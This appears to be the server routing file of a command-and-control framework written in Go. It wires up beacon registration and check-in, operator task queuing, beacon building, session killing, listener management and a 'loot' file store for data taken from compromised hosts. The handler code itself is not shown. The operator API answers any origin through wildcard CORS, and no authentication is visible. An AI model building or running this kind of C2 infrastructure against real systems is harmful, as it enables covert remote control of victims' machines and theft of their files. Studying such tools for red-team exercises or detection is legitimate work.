package server

import (
	"crypto/rsa"
	"fmt"
	"net/http"
	"time"

	"c2/models"
	"c2/store"
	"c2/ui"
)

func Run(port int, host string, s *store.Store, privKey *rsa.PrivateKey, beaconSrc string, p saver, toRestart []*models.Listener) (*http.Server, *ListenerManager, error) {
	lm := NewListenerManager()
	h := NewHandler(s, privKey, beaconSrc, lm, p, port)

	beaconMux := newBeaconMux(h)
	for _, l := range toRestart {
		if err := lm.Start(l, beaconMux); err != nil {
			ui.Error("listener", fmt.Sprintf("%q failed: %v", l.Name, err))
		} else {
			ui.Success("listener", fmt.Sprintf("%q on 0.0.0.0:%d", l.Name, l.Port))
		}
	}

	mux := http.NewServeMux()

	// Beacon protocol routes
	mux.HandleFunc("GET /api/pubkey", h.HandleGetPubKey)
	mux.HandleFunc("POST /api/register", h.HandleRegister)
	mux.HandleFunc("POST /api/checkin", h.HandleCheckin)
	mux.HandleFunc("POST /api/result", h.HandleResult)

	// Operator JSON API routes (CORS enabled)
	mux.HandleFunc("GET /api/sessions", cors(h.HandleGetSessions))
	mux.HandleFunc("POST /api/task", cors(h.HandleQueueTask))
	mux.HandleFunc("OPTIONS /api/task", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("GET /api/results/{id}", cors(h.HandleGetResults))
	mux.HandleFunc("OPTIONS /api/results/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("POST /api/build", cors(h.HandleBuild))
	mux.HandleFunc("OPTIONS /api/build", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("DELETE /api/sessions/{id}", cors(h.HandleKillBeacon))
	mux.HandleFunc("OPTIONS /api/sessions/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Listener management routes
	mux.HandleFunc("GET /api/listeners", cors(h.HandleListListeners))
	mux.HandleFunc("POST /api/listeners", cors(h.HandleCreateListener))
	mux.HandleFunc("OPTIONS /api/listeners", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("DELETE /api/listeners/{id}", cors(h.HandleDeleteListener))
	mux.HandleFunc("OPTIONS /api/listeners/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Event log routes
	mux.HandleFunc("GET /api/events", cors(h.HandleGetEvents))
	mux.HandleFunc("POST /api/events", cors(h.HandlePostEvent))
	mux.HandleFunc("OPTIONS /api/events", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// Terminal state routes
	mux.HandleFunc("GET /api/terminal/{id}", cors(h.HandleGetTerminal))
	mux.HandleFunc("PUT /api/terminal/{id}", cors(h.HandlePutTerminal))
	mux.HandleFunc("POST /api/terminal/{id}", cors(h.HandlePutTerminal))
	mux.HandleFunc("OPTIONS /api/terminal/{id}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	// File transfer routes
	mux.HandleFunc("POST /api/upload", cors(h.HandleUpload))
	mux.HandleFunc("GET /api/loot", cors(h.HandleListFiles))
	mux.HandleFunc("OPTIONS /api/loot", cors(func(w http.ResponseWriter, r *http.Request) {}))
	mux.HandleFunc("GET /api/files/{label}", cors(h.HandleGetFile))
	mux.HandleFunc("DELETE /api/files/{label}", cors(h.HandleDeleteFile))
	mux.HandleFunc("OPTIONS /api/files/{label}", cors(func(w http.ResponseWriter, r *http.Request) {}))

	ui.Success("ready", fmt.Sprintf("0.0.0.0:%d (host: %s)", port, host))
	ui.Quote("The Bebop is online. Carry that weight.")
	ui.Blank()

	srv := &http.Server{
		Addr:         fmt.Sprintf(":%d", port),
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
	}
	go func() {
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			ui.Errorf("server", "%v", err)
		}
	}()
	return srv, lm, nil
}

func cors(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next(w, r)
	}
}
